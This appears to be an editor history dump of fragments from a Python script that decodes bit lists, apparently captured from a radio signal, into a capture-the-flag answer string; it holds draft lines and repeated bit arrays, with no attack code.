	nums = [1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, ]
5885f78342c4b3f557029866b745dceb|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|11|1|V|python
	print(len(nums)/8)
04ae629337746a5c823768b625e173c0|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|5|3|V|python
	    n /= 10 ** 6
8c66a8d9c6adbde341a61262fb9e6495|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|3|1|V|python
	nums = [nums[i:i+8] for i in range (nums)]
25deeeba8f3fa6cb11c45099a2ca2ed3|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|11|1|V|python
	# pt = ''.join(str(x) for x in nums)
06548716583d8141fc05242f21ac5986|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|12|1|V|python
	n = int(pt,2)
53d00d034f658dd076389bc7906fecdf|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|17|13|v|python
	n.to_bytes((n.bit_length() + 7) // 8, 'big').decode()
705a5136d0e0e91bdd87b7230c39d101|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|2|1|V|python
	nums = [ 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1 ] 
bc91b6c4b05680aba0259775e597e1dc|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|2|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1 ]
03f0e63ef76627c8bd54eec5a9fdfafa|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0 ]
3992f5f5e79f771ef1b2bcc481da3952|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [ 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0] 
ff8fba3b7fb33eccc649b5b7d12670a1|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, ]
aa038a9cb5a6730b25cb018d956c6cae|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [ 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, ]
c49e9c282895535774afa29b4cb72773|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
0cb56cbb8d9b7659880a34e8af348b4d|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums =  [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, ]
ff960d39a6f148b5832631f618ade00a|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|2|1|V|python
	nums = [ 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, ]
2e40d425b8d479c3c5647064d8cd37ee|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [ 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
81dae3942def0e25d886260d4805344f|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, ]
51cce2ba4c19b035247182d377b1d5b9|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, ]
e3c6712dedd960a7d6575d95d6e2c5ec|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, ]
b4ca43218b4dfbbdb6a6da4675b0a10e|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|18|5|V|python
	    except:
3fbb6afe1c857d0b037d8e5b9d0c6cc7|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|18|9|V|python
	        flag+= '?'
6067190b28739757cbee4dcc6c1b501f|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
daaabccee20275f3ed5478d2f185d3ce|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
